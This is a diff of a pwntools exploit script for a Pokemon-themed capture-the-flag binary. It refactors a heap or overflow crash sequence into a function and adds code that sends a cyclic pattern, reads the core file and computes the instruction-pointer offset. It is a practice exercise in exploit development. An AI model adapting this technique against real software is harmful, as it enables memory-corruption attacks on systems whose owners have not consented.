@@ -24,7 +24,7 @@ exe = ELF("./kappa_patched")
 hook = ELF("./hook.so")
 
 context.binary = exe
-context.log_level = 'debug'
+context.log_level = 'info'
 context.terminal = ['gnome-terminal', '-e']
 context.delete_corefiles = True
 
@@ -95,7 +95,7 @@ def conn():
 def name_pokemon(io, name):
     '''Name a Pokemon.
     '''
-    io.sendlineafter(b'What would you like to name this Pokemon?', name)
+    io.sendlineafter(b'What would you like to name this Pokemon?', name.encode())
 
 def catch_pokemon(io, pokemon):
     '''Catch a Kakuna.
@@ -144,58 +144,74 @@ def choose_an_option(io, command):
     io.sendline(str(command.value).encode())
 
 def inspect_core(io):
-    '''Inspect the core.
+    '''Inspect the core and return the faulting address.
     '''
     try:
         core = io.corefile
-        log.info(f'The faulting address is {hex(core.fault_addr)}')
 
-        # Delete the core file.
+        # Delete the core file and return the faulting address.
         #os.remove(core.path)
+        return core.fault_addr
+
     except:
         log.error('Failed to open core.')
 
-def main():
-    '''Return the flag.
+def get_eip_control(io, payload):
+    '''Get EIP control.
     '''
 
+
+    # Catch four Kakunas (we can only have five Pokemon).
+    for i in range(0, 4):
+        catch_pokemon(io, Pokemon.KAKUNA)
+
+    # Catch a Charizard.
+    catch_pokemon(io, Pokemon.CHARIZARD)
+
+    # Remove the third Pokemon from our party. I am not sure if the order is
+    # important yet, but I have observed the segfault when we release the
+    # third Pokemon. This will now be a Charizard.
+    choose_an_option(io, Party.THIRD)
+
+    # Change its artwork.
+    choose_an_option(io, Choice.CHANGE_POKEMON_ARTWORK)
+
+    # Choose the third pokemon (which is now a Charizard).
+    choose_an_option(io, Party.THIRD)
+
+    # It will accept up to ~4k bytes, so let's make a cyclic pattern that large.
+    io.sendline(payload)
+    io.recvline()
+
+    # Inspect our Pokemon. This should trigger the segfault.
+    # For some reason I am currently unsure of, just sending one command
+    # doesn't work. It seems to only work when they are grouped together
+    # on the same line.
+    io.sendline(str(Choice.INSPECT_POKEMON.value).encode() * 20)
+
+    return io
+
+def main():
+    '''Return the flag.'''
     with conn() as io:
 
-        # Catch four Kakunas (we can only have five Pokemon).
-        for i in range(0, 4):
-            catch_pokemon(io, Pokemon.KAKUNA)
+        # First crash the program to determine the offset to EIP.
+        payload = cyclic(5000)
+        get_eip_control(io, payload=payload)
 
-        # Catch a Charizard.
-        catch_pokemon(io, Pokemon.CHARIZARD)
-
-        # Remove the third Pokemon from our party. I am not sure if the order is
-        # important yet, but I have observed the segfault when we release the
-        # third Pokemon. This will now be a Charizard.
-        choose_an_option(io, Party.THIRD)
-
-
-        # Change its artwork.
-        choose_an_option(io, Choice.CHANGE_POKEMON_ARTWORK)
-
-        # Choose the third pokemon (which is now a Charizard).
-        choose_an_option(io, Party.THIRD)
-
-        # It will accept up to ~4k bytes, so let's make a cyclic pattern that large.
-        io.sendline(cyclic(5000))
-        io.recvline()
-
-        # # Inspect our Pokemon. This should trigger the segfault.
-        # # For some reason I am currently unsure of, just sending one command
-        # # doesn't work. It seems to only work when they are grouped together
-        # # on the same line, at least two are needed. This sends '33'.
-        io.sendline(str(Choice.INSPECT_POKEMON.value) * 1)
-        # #io.close()
-        # io.recvline()
-        io.interactive()
-
+        # Wait for the Corefile to be written.
+        io.wait(2)
         # Inspect the core.
-        #inspect_core(io)
+        faulting_addr = inspect_core(io)
 
+        # Get the faulting address and determine the offset at which our input
+        # makes it into the instruction pointer.
+        log.info(f'The faulting address is: {hex(faulting_addr)}')
+
+        assert pack(faulting_addr) in payload, 'Faulting address not in pattern.'
+
+        offset = cyclic_find(pack(faulting_addr))
+        log.info(f'The offset is: {offset}')
 
 if __name__ == '__main__':
     main()
